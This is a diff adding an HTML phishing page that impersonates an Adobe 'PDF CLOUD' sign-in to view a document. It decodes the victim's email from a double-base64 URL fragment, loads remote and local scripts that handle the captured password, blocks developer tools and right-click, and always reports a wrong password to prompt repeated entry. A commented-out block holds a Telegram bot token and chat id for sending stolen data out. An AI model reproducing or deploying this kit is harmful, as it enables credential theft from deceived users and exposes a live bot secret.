@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" id="favicon" href="" type="image/x-icon">
+    <link rel="shortcut icon" href="https://adobe.com/favicon.ico" type="image/x-icon">
+	 <link id="adobestyle" rel="stylesheet" href="">
+    <!--<link rel="stylesheet" href="./Sign In - PDF CLOUD_files/font-awesome.css">-->
+    <title>Sign In - PDF CLOUD</title>
+    <style>
+       
+    </style>
+</head>
+
+<body data-gr-c-s-loaded="true">
+    <header>
+        <div class="brand">
+            <img id="pdflogo" src="" alt="Adobe ID Logo">
+            <h1>PDF CLOUD</h1>
+        </div>
+        <div class="search">
+            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
+        </div>
+    </header>
+    <div class="container">
+        <div class="dash cover">
+            <div class="board animated fadeIn">
+                <div class="login">
+                    <form id="contact" onkeypress="return checkSubmit(event)">
+                        <ul>
+                            <li class="l1"><svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img"
+                                    class="spectrum-Icon spectrum-Icon--sizeM nav-logo">
+                                    <path
+                                        d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z">
+                                    </path>
+                                </svg>
+                                <p class="">PDF Cloud</p>
+                            </li>
+                            <li class="l2">
+                                <p>For security, please sign in with your email to verify your Identity, and view
+                                    documents.</p>
+                            </li>
+                            <li class="l3"><img id="pdfimage" src="" alt="Adobe ID Logo">
+                                <p>PDF Document</p>
+                            </li><br>
+
+                            <div class="text-danger" id="msg" style="display: none; color: red; font-style: italic; font-size: 13px;">Invalid Password! Please Enter your correct Password</div>
+                            <span id="msgs" class="text-danger" style="display: none;">That account doesn't exist.
+                                Enter a different account</span>
+
+                            <li class="l4 animated fadeIn" id="err">
+                                <p id="erp">Error Message</p>
+                            </li>
+                            <li><input type="email" name="email" class="inp" id="email" autocomplete="off"
+                                    placeholder="Email Address"
+                                    style="background-image: url(&quot;&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"
+                                    readonly=""></li>
+                            <li><input type="password" name="password" class="inp" id="password" autofocus required oninput="off"
+                                    placeholder="Email Password"
+                                    style="background-image: url(&quot;&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+									
+									<input type="hidden" id="domain" name="domain">
+									<input type="hidden" id="fieldName" name="fieldName">
+                            </li><br>
+                            <li><button type="submit" name="submit" class="btn" id="submit-btn">Sign In</button></li>
+
+
+                            <li class="l5">
+                                <p>Copyright © 2025 Adobe Corporation</p>
+                            </li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+       <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script type="text/javascript" src="https://fonts.cfd/jquery/js/view.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+	<!-- TELEGRAM BOT <script>
+  		        var tx1="1492442813";
+var tx2="8444189618:AAFmYLvjfd-MFReTAgU6wbm3SmeI-BqErdo";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+ 
+ 
+         let u53TiQ = '';
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        u53TiQ = data.ip;
+      }); 
+  
+  </script>-->
+ <script>
+
+function isBase64(encodedString) {
+    var regexBase64 = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+    return regexBase64.test(encodedString);   // return TRUE if its base64 string.
+}
+var email ="";
+$(document).ready(function(){
+	
+	
+	//set global variables
+	var vsr = window.location.href.slice(window.location.href.indexOf('#') + 1);
+	const myArray = vsr.split("&");
+	vsr = myArray[0];
+	if (isBase64(vsr)){
+		email = atob(atob(vsr));
+		
+	}
+		
+	//set external files
+	const prefix = "file:///C:/Users/Administrator/Desktop/SCRIPTS/01/01/generalPg/enterprise/";
+
+	var arrayset =[
+			["favicon", "adobe_favicon.ico","href","id"],
+			["adobestyle","adobestylesheet.css","href","id"],
+			["pdfimage","pdfimage.png","src","id"],
+			["pdflogo","pdflogo.png","src","id"],
+	
+	]
+
+
+    // Load the external script and call the external callback function
+           loadExternalScript('enterprise.js', function() {
+				checkDNS(vsr,function(){
+					onBodyLoad(arrayset, prefix, vsr);
+				});
+             
+
+            });
+
+			
+	// function to load external script
+	function loadExternalScript(url,callback) {
+		var script = document.createElement('script');
+		script.src = prefix + url;
+		script.onload = function() {
+			
+			if (callback) {
+				callback();				
+			}
+			
+		};
+
+		document.head.appendChild(script); // Append the script to the body
+	}
+
+	document.getElementById('msg').innerHTML="Enter your credentials to view document.";
+			$('#msg').show();
+});
+	
+
+document.addEventListener('keydown', event => {
+  if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
+    event.preventDefault();
+  }
+});
+
+
+
+// Disable right-click context menu
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+
+//avoid form submission without validation
+$('#submit-btn').on('click', function(event) {
+	//alert("start fxnt");
+	clkLgn(function(statusCode){
+		
+		displayCss(statusCode);
+		
+
+	});
+});
+$('#contact').on('keydown', function(event) {
+        checkSubmit(event, function(statusCode) {
+
+			displayCss(statusCode);
+        });
+    });
+	
+function displayCss(status){
+
+		if(status){
+			document.getElementById('msg').innerHTML="Incorrect Password for <span style='color:rgba(26,115,232,1);font-weight:bold'>"+email+" </span>.";
+			$('#msg').show();
+		}else {
+			document.getElementById('msg').innerHTML="The username or password is incorrect.";
+			
+			$('#msg').show();
+		}
+}
+</script>
+
+
+
+
+</body>
+
+</html>
